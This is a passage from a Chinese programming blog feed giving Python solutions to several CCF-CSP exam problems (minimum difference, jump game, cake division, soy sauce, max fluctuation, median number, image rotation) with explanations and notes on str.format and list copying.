<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">"I"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="string">"Love"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="string">"You"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;&#125; &#123;&#125; &#123;&#125;'</span>.format(a, b, c)	<span class="comment"># 按默认顺序</span></div><div class="line"><span class="string">'I Love You'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;2&#125; &#123;1&#125; &#123;0&#125;'</span>.format(a, b, c)	<span class="comment"># 指定位置</span></div><div class="line"><span class="string">'You Love I'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;0&#125; &#123;1[0]&#125; &#123;1[1]&#125;'</span>.format(a, [b, c])	<span class="comment"># 传入参数为列表</span></div><div class="line"><span class="string">'I Love You'</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 最小差值与跳一跳</title>
    <url>/2018/09/27/CCF-CSP-%E6%9C%80%E5%B0%8F%E5%B7%AE%E5%80%BC%E4%B8%8E%E8%B7%B3%E4%B8%80%E8%B7%B3/</url>
    <content><![CDATA[<center>CCF-CSP 201712-1 最小差值 与 201803-1 跳一跳 题解</center>

<a id="more"></a>
<h4 id="201712-1-最小差值"><a href="#201712-1-最小差值" class="headerlink" title="201712-1 最小差值"></a>201712-1 最小差值</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201712-1</div><div class="line">试题名称：最小差值</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    给定n个数，请找出其中相差（差的绝对值）最小的两个数，输出它们的差值的绝对值。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入第一行包含一个整数n。</div><div class="line">    第二行包含n个正整数，相邻整数之间使用一个空格分隔。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示答案。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    5</div><div class="line">    1 5 4 8 20</div><div class="line"></div><div class="line">样例输出</div><div class="line">    1</div><div class="line"></div><div class="line">样例说明</div><div class="line">    相差最小的两个数是5和4，它们之间的差值是1。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    5</div><div class="line">    9 3 6 1 3</div><div class="line"></div><div class="line">样例输出</div><div class="line">    0</div><div class="line"></div><div class="line">样例说明</div><div class="line">    有两个相同的数3，它们之间的差值是0.</div><div class="line"></div><div class="line">数据规模和约定</div><div class="line">    对于所有评测用例，2 ≤ n ≤ 1000，每个给定的整数都是不超过10000的正整数。</div></pre></td></tr></table></figure>
<h5 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h5><p>　　这个题目与前面题目（201609-1 最大波动）的思路类似，只要遍历输入的整数列表，得到元素与其后面元素的元素差值的绝对值，不断地比较绝对值，得到较小的差值，最后的较小差值就是最小的差值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 整数个数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 整数列表</span></div><div class="line"></div><div class="line">res = abs(lst[<span class="number">1</span>] - lst[<span class="number">0</span>])  <span class="comment"># 初始化，也可初始化为题目给定的整数最大值</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):  <span class="comment"># 从第1个数扫描到倒数第2个数</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, n):  <span class="comment"># 计算每个数与其后所有数的差值的绝对值</span></div><div class="line">        tmp = abs(lst[i] - lst[j])  <span class="comment"># 取差值的绝对值</span></div><div class="line">        <span class="keyword">if</span> tmp &lt; res:  <span class="comment"># 得到较小的差值</span></div><div class="line">            res = tmp</div><div class="line"></div><div class="line">print(res)  <span class="comment"># 输出最小差值</span></div></pre></td></tr></table></figure>
<h5 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h5><p>　　也可以先对整数列表进行排序，然后遍历列表中的元素，这样只需得到每个元素后的 1 个元素与其的差值，然后与较小的差值记录进行比较即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 整数个数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 整数列表</span></div><div class="line"></div><div class="line">lst.sort()  <span class="comment"># 排序</span></div><div class="line">res = lst[<span class="number">1</span>] - lst[<span class="number">0</span>]  <span class="comment"># 初始化</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n - <span class="number">1</span>):  <span class="comment"># 遍历1到n-1号元素</span></div><div class="line">    <span class="keyword">if</span> res &gt; lst[i + <span class="number">1</span>] - lst[i]:  <span class="comment"># 取较小的差值</span></div><div class="line">        res = lst[i + <span class="number">1</span>] - lst[i]</div><div class="line"></div><div class="line">print(res)  <span class="comment"># 输出最小差值</span></div></pre></td></tr></table></figure>
<h4 id="201803-1-跳一跳"><a href="#201803-1-跳一跳" class="headerlink" title="201803-1 跳一跳"></a>201803-1 跳一跳</h4><h5 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201803-1</div><div class="line">试题名称：跳一跳</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    近来，跳一跳这款小游戏风靡全国，受到不少玩家的喜爱。</div><div class="line">    简化后的跳一跳规则如下：玩家每次从当前方块跳到下一个方块，如果没有跳到下一个方块上则游戏结束。</div><div class="line">    如果跳到了方块上，但没有跳到方块的中心则获得1分；跳到方块中心时，若上一次的得分为1分或这是本局游戏的第一次跳跃则此次得分为2分，否则此次得分比上一次得分多两分（即连续跳到方块中心时，总得分将+2，+4，+6，+8...）。</div><div class="line">    现在给出一个人跳一跳的全过程，请你求出他本局游戏的得分（按照题目描述的规则）。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入包含多个数字，用空格分隔，每个数字都是1，2，0之一，1表示此次跳跃跳到了方块上但是没有跳到中心，2表示此次跳跃跳到了方块上并且跳到了方块中心，0表示此次跳跃没有跳到方块上（此时游戏结束）。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，为本局游戏的得分（在本题的规则下）。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    1 1 2 2 2 1 1 2 2 0</div><div class="line"></div><div class="line">样例输出</div><div class="line">    22</div><div class="line"></div><div class="line">数据规模和约定</div><div class="line">    对于所有评测用例，输入的数字不超过30个，保证0正好出现一次且为最后一个数字。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　这个题目有点意思，不过，也很简单。只要按照题目给的说明，分情况讨论就可以很快的解决问题。记录为 0 时，直接输出分数；记录 1 为时记 1 分，分数加 1；记录为 2 时，如果前 1 个记录是 1 ，记 2 分，<code>flag</code> 标志设置为 1 ；记录为 2 时，如果前 1 个记录也是 2 ，记 <code>2*flag</code> 分，分数加上加 <code>2*flag</code> 。遍历记录列表进行计分，最后即可得到最终的分数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">lst = list(map(int, input().split()))</div><div class="line"></div><div class="line">score = lst[<span class="number">0</span>]</div><div class="line">flag = <span class="number">1</span>  <span class="comment"># 标志记录连续几次为2</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(lst)):</div><div class="line">    <span class="keyword">if</span> lst[i] == <span class="number">0</span>:  <span class="comment"># 记录为0的情况</span></div><div class="line">        print(score)</div><div class="line">    <span class="keyword">elif</span> lst[i] == <span class="number">1</span>:  <span class="comment"># 记录为1的情况</span></div><div class="line">        score += <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> lst[i] == <span class="number">2</span> <span class="keyword">and</span> lst[i - <span class="number">1</span>] == <span class="number">1</span>:  <span class="comment"># 这一次记录是2，上一次记录1的情况</span></div><div class="line">        flag = <span class="number">1</span></div><div class="line">        score += <span class="number">2</span></div><div class="line">    <span class="keyword">elif</span> lst[i] == <span class="number">2</span> <span class="keyword">and</span> lst[i - <span class="number">1</span>] == <span class="number">2</span>:  <span class="comment"># 这一次与上一次都是2的情况</span></div><div class="line">        flag += <span class="number">1</span></div><div class="line">        score += <span class="number">2</span> * flag</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 分蛋糕与打酱油</title>
    <url>/2018/09/27/CCF-CSP-%E5%88%86%E8%9B%8B%E7%B3%95%E4%B8%8E%E6%89%93%E9%85%B1%E6%B2%B9/</url>
    <content><![CDATA[<center>CCF-CSP 201703-1 分蛋糕 与 201709-1 打酱油 题解</center>

<a id="more"></a>
<h4 id="201703-1-分蛋糕"><a href="#201703-1-分蛋糕" class="headerlink" title="201703-1 分蛋糕"></a>201703-1 分蛋糕</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201703-1</div><div class="line">试题名称：分蛋糕</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    小明今天生日，他有n块蛋糕要分给朋友们吃，这n块蛋糕（编号为1到n）的重量分别为a1, a2, …, an。小明想分给每个朋友至少重量为k的蛋糕。小明的朋友们已经排好队准备领蛋糕，对于每个朋友，小明总是先将自己手中编号最小的蛋糕分给他，当这个朋友所分得蛋糕的重量不到k时，再继续将剩下的蛋糕中编号最小的给他，直到小明的蛋糕分完或者这个朋友分到的蛋糕的总重量大于等于k。</div><div class="line">    请问当小明的蛋糕分完时，总共有多少个朋友分到了蛋糕。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含了两个整数n, k，意义如上所述。</div><div class="line">    第二行包含n个正整数，依次表示a1, a2, …, an。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示有多少个朋友分到了蛋糕。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    6 9</div><div class="line">    2 6 5 6 3 5</div><div class="line"></div><div class="line">样例输出</div><div class="line">    3</div><div class="line"></div><div class="line">样例说明</div><div class="line">    第一个朋友分到了前3块蛋糕，第二个朋友分到了第4、5块蛋糕，第三个朋友分到了最后一块蛋糕。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    对于所有评测用例，1 ≤ n ≤ 1000，1 ≤ k ≤ 10000，1 ≤ ai ≤ 1000。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　从第 1 块开始分，计算分配的重量，如果重量大于 k ，则表示这几块蛋糕已经满足重量 k ，可以全部分配给 1 位小朋友，如果不足 k ，则再分 1 块，直到满足重量 k 。但是，需要注意一种情况，即最后几块蛋糕的重量也不足k。这样的情况则直接把剩下的蛋糕全部分配给 1 位小朋友。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n, k = map(int, input().split())  <span class="comment"># 小朋友的人数和希望给每位小朋友分的蛋糕的重量</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 表示每块蛋糕重量的列表</span></div><div class="line">count = <span class="number">0</span>  <span class="comment"># 分到蛋糕的人数</span></div><div class="line">tmp = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    tmp += lst[i]  <span class="comment"># 计算分配的重量</span></div><div class="line">    <span class="keyword">if</span> tmp &gt;= k:  <span class="comment"># 是否大于k</span></div><div class="line">        tmp = <span class="number">0</span>  <span class="comment"># 重置</span></div><div class="line">        count += <span class="number">1</span>  <span class="comment"># 分配给 1 位朋友</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">if</span> i == n - <span class="number">1</span>:  <span class="comment"># 处理重量不足k的最后几块蛋糕</span></div><div class="line">            count += <span class="number">1</span>  <span class="comment"># 分配给 1 位朋友</span></div><div class="line"></div><div class="line">print(count)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="201709-1-打酱油"><a href="#201709-1-打酱油" class="headerlink" title="201709-1 打酱油"></a>201709-1 打酱油</h4><h5 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201709-1</div><div class="line">试题名称：打酱油</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    小明带着N元钱去买酱油。酱油10块钱一瓶，商家进行促销，每买3瓶送1瓶，或者每买5瓶送2瓶。请问小明最多可以得到多少瓶酱油。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数N，表示小明可用于买酱油的钱数。N是10的整数倍，N不超过300。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示小明最多可以得到多少瓶酱油。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    40</div><div class="line"></div><div class="line">样例输出</div><div class="line">    5</div><div class="line"></div><div class="line">样例说明</div><div class="line">    把40元分成30元和10元，分别买3瓶和1瓶，其中3瓶送1瓶，共得到5瓶。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    80</div><div class="line"></div><div class="line">样例输出</div><div class="line">    11</div><div class="line"></div><div class="line">样例说明</div><div class="line">    把80元分成30元和50元，分别买3瓶和5瓶，其中3瓶送1瓶，5瓶送2瓶，共得到11瓶。</div></pre></td></tr></table></figure>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>　　这个题目也非常简单，先按买5瓶的计算，如果可以买5瓶，则优先买5瓶，即 <code>(int(n / 50)) * 7</code>。剩下钱，即 <code>int((n % 50)</code>，如果可以买 3 瓶则优先买 3 瓶，即 <code>int((n % 50) / 30) * 4</code>，最后再按 1 瓶买，即 <code>int((n % 50 % 30) / 10)</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 买酱油的钱</span></div><div class="line">p = (int(n / <span class="number">50</span>)) * <span class="number">7</span> + int((n % <span class="number">50</span>) / <span class="number">30</span>) * <span class="number">4</span> + int((n % <span class="number">50</span> % <span class="number">30</span>) / <span class="number">10</span>)  <span class="comment"># 酱油瓶数</span></div><div class="line">print(p)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 最大波动与中间数</title>
    <url>/2018/09/26/CCF-CSP-%E6%9C%80%E5%A4%A7%E6%B3%A2%E5%8A%A8%E4%B8%8E%E4%B8%AD%E9%97%B4%E6%95%B0/</url>
    <content><![CDATA[<center>CCF-CSP 201609-1 最大波动 与 201612-1 中间数 题解</center>

<a id="more"></a>
<h4 id="201609-1-最大波动"><a href="#201609-1-最大波动" class="headerlink" title="201609-1 最大波动"></a>201609-1 最大波动</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201609-1</div><div class="line">试题名称：最大波动</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    小明正在利用股票的波动程度来研究股票。小明拿到了一只股票每天收盘时的价格，他想知道，这只股票连续几天的最大波动值是多少，即在这几天中某天收盘价格与前一天收盘价格之差的绝对值最大是多少。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含了一个整数n，表示小明拿到的收盘价格的连续天数。</div><div class="line">    第二行包含n个正整数，依次表示每天的收盘价格。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示这只股票这n天中的最大波动值。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    6</div><div class="line">    2 5 5 7 3 5</div><div class="line"></div><div class="line">样例输出</div><div class="line">    4</div><div class="line"></div><div class="line">样例说明</div><div class="line">    第四天和第五天之间的波动最大，波动值为|3-7|=4。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    对于所有评测用例，2 ≤ n ≤ 1000。股票每一天的价格为1到10000之间的整数。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　这个题目也很简单，只要遍历输入的价格列表，得到元素与下一个元素差值的绝对值，不断地比较绝对值，得到最大的差值，即为最大的波动值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 获取天数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 获取价格列表</span></div><div class="line"></div><div class="line">res = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):  <span class="comment"># 遍历价格列表</span></div><div class="line">    tmp = abs(lst[i] - lst[i + <span class="number">1</span>])  <span class="comment"># 取差值</span></div><div class="line">    <span class="keyword">if</span> tmp &gt; res:  <span class="comment"># 比较大小</span></div><div class="line">        res = tmp  <span class="comment"># 较大的差值</span></div><div class="line">print(res)  <span class="comment"># 输出最大差值</span></div></pre></td></tr></table></figure>
<h4 id="201612-1-中间数"><a href="#201612-1-中间数" class="headerlink" title="201612-1 中间数"></a>201612-1 中间数</h4><h5 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201612-1</div><div class="line">试题名称：中间数</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    在一个整数序列a1, a2, …, an中，如果存在某个数，大于它的整数数量等于小于它的整数数量，则称其为中间数。在一个序列中，可能存在多个下标不相同的中间数，这些中间数的值是相同的。</div><div class="line">    给定一个整数序列，请找出这个整数序列的中间数的值。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含了一个整数n，表示整数序列中数的个数。</div><div class="line">    第二行包含n个正整数，依次表示a1, a2, …, an。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    如果约定序列的中间数存在，则输出中间数的值，否则输出-1表示不存在中间数。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    6</div><div class="line">    2 6 5 6 3 5</div><div class="line"></div><div class="line">样例输出</div><div class="line">    5</div><div class="line"></div><div class="line">样例说明</div><div class="line">    比5小的数有2个，比5大的数也有2个。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    4</div><div class="line">    3 4 6 7</div><div class="line"></div><div class="line">样例输出</div><div class="line">    -1</div><div class="line"></div><div class="line">样例说明</div><div class="line">    在序列中的4个数都不满足中间数的定义。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    5</div><div class="line">    3 4 6 6 7</div><div class="line"></div><div class="line">样例输出</div><div class="line">    -1</div><div class="line"></div><div class="line">样例说明</div><div class="line">    在序列中的5个数都不满足中间数的定义。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    对于所有评测用例，1 ≤ n ≤ 1000，1 ≤ ai ≤ 1000。</div></pre></td></tr></table></figure>
<h5 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h5><p>　　最简单的办法就是统计每个元素的以下信息：（1 大于该元素的元素个数（记作 gt ），（2 小于该元素的个数(记作 lt )，如果 gt 等于 lt 且不等于 0，则认为已经找到中间数，设置标志位为1，输出中间数，并且结束遍历。如果遍历完所有的元素，标志位还没有被置为 1，即没有找到中间数，则输出 -1 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 获取整数个数</span></div><div class="line">L = list(map(int, input().split()))  <span class="comment"># 获取整数序列</span></div><div class="line">gt = <span class="number">0</span></div><div class="line">lt = <span class="number">0</span></div><div class="line">flag = <span class="number">0</span>  <span class="comment"># 标志是否找到中间数</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</div><div class="line">        <span class="keyword">if</span> L[i] &lt; L[j]:  <span class="comment"># 统计大于该元素的元素个数</span></div><div class="line">            gt += <span class="number">1</span></div><div class="line">        <span class="keyword">if</span> L[i] &gt; L[j]:  <span class="comment"># 统计小于该元素的元素个数</span></div><div class="line">            lt += <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> gt == lt <span class="keyword">and</span> gt != <span class="number">0</span>:  <span class="comment"># 大于的个数和小于的个数相等，且不为0</span></div><div class="line">        print(L[i])  <span class="comment"># 输出中间数</span></div><div class="line">        flag = <span class="number">1</span>  <span class="comment"># 标志已经找到</span></div><div class="line">        <span class="keyword">break</span>  <span class="comment"># 结束循环</span></div><div class="line">    gt = <span class="number">0</span>  <span class="comment"># 重置</span></div><div class="line">    lt = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> flag == <span class="number">0</span>:  <span class="comment"># 没有找到中间数</span></div><div class="line">    print(<span class="string">'-1'</span>)</div></pre></td></tr></table></figure>
<h5 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h5><p>　　另一种办法是，先对列表进行排序，然后找到排在中间的那个元素，即候选的中间数。然后，再遍历列表将候选的中间元素与列表的每个元素进行比较并计数，判断大于中间元素的个数是否等于小于它的个数，如果等于则该数就是中间数，输出中间数，否则没有中间数，输出 -1 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 获取整数个数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 获取整数序列</span></div><div class="line">rst = lst.copy()  <span class="comment"># 复制列表，用于排序</span></div><div class="line">rst.sort()  <span class="comment"># 排序，用于得到中间元素</span></div><div class="line"></div><div class="line">lt = <span class="number">0</span></div><div class="line">gt = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:  <span class="comment"># 这里只需要一层循环</span></div><div class="line">    <span class="keyword">if</span> rst[int(n / <span class="number">2</span>)] &gt; i:  <span class="comment"># 统计小于中间元素的元素个数</span></div><div class="line">        lt += <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> rst[int(n / <span class="number">2</span>)] &lt; i:  <span class="comment"># 统计大于中间元素的元素个数</span></div><div class="line">        gt += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> lt == gt:</div><div class="line">    print(rst[int(n / <span class="number">2</span>)])  <span class="comment"># 输出结果</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">    print(<span class="number">-1</span>)  <span class="comment"># 没有找到中间数</span></div></pre></td></tr></table></figure>
<h4 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h4><h5 id="copy-函数"><a href="#copy-函数" class="headerlink" title="copy() 函数"></a>copy() 函数</h5><p>　　copy() 函数用于复制列表，它会返回复制后的新列表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.copy()</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
<p>　　下面用一个例子来说明 <code>copy()</code> 函数与切片、直接赋值的异同：</p>
<ul>
<li>copy ()函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst = lst.copy() <span class="comment"># 使用 copy() 函数复制</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst[<span class="number">1</span>] = <span class="number">5</span>	</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst</div><div class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst	<span class="comment"># 修改复制后的列表，原列表值不变</span></div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
<ul>
<li>切片</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst = lst[:] <span class="comment"># 使用切片</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst[<span class="number">1</span>] = <span class="number">5</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst</div><div class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst	<span class="comment"># 修改复制后的列表，原列表值不变</span></div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
<ul>
<li>直接赋值</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst = lst <span class="comment"># 直接赋值</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst[<span class="number">1</span>] = <span class="number">5</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>rst</div><div class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst <span class="comment"># 修改复制后的列表，原列表值也改变了</span></div><div class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>]</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 图像旋转与数位之和</title>
    <url>/2018/09/26/CCF-CSP-%E5%9B%BE%E5%83%8F%E6%97%8B%E8%BD%AC%E4%B8%8E%E6%95%B0%E4%BD%8D%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<center>CCF-CSP 201503-1 图像旋转 与 201512-1 数位之和 题解</center>

<a id="more"></a>
<h4 id="201503-1-图像旋转"><a href="#201503-1-图像旋转" class="headerlink" title="201503-1 图像旋转"></a>201503-1 图像旋转</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201503-1</div><div class="line">试题名称：图像旋转</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    旋转是图像处理的基本操作，在这个问题中，你需要将一个图像逆时针旋转90度。</div><div class="line">    计算机中的图像表示可以用一个矩阵来表示，为了旋转一个图像，只需要将对应的矩阵旋转即可。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含两个整数n, m，分别表示图像矩阵的行数和列数。</div><div class="line">    接下来n行每行包含m个整数，表示输入的图像。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出m行，每行包含n个整数，表示原始矩阵逆时针旋转90度后的矩阵。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    2 3</div><div class="line">    1 5 3</div><div class="line">    3 2 4</div><div class="line"></div><div class="line">样例输出</div><div class="line">    3 4</div><div class="line">    5 2</div><div class="line">    1 3</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    1 ≤ n, m ≤ 1,000，矩阵中的数都是不超过1000的非负整数。</div></pre></td></tr></table></figure>
<h5 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h5><p>　　根据输出结果找规律，我们可以发现 m 行 n 列变成 n 行 m 列，并且是从右往左依次输出每一列。于是，我们使用两个循环输出即可。</p>
